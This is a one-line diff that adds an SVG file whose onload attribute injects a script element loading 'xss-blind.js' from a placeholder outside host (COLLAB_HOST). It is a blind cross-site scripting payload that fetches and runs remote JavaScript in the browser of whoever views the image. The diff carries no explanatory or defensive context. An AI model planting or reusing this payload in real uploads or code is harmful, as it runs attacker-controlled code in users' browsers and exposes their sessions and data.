@@ -1,0 +1,1 @@
+<svg xmlns="http://www.w3.org/2000/svg" onload="var s=document.createElementNS('http://www.w3.org/2000/svg','script');s.setAttribute('href','https://COLLAB_HOST/xss-blind.js');document.documentElement.appendChild(s)"/>
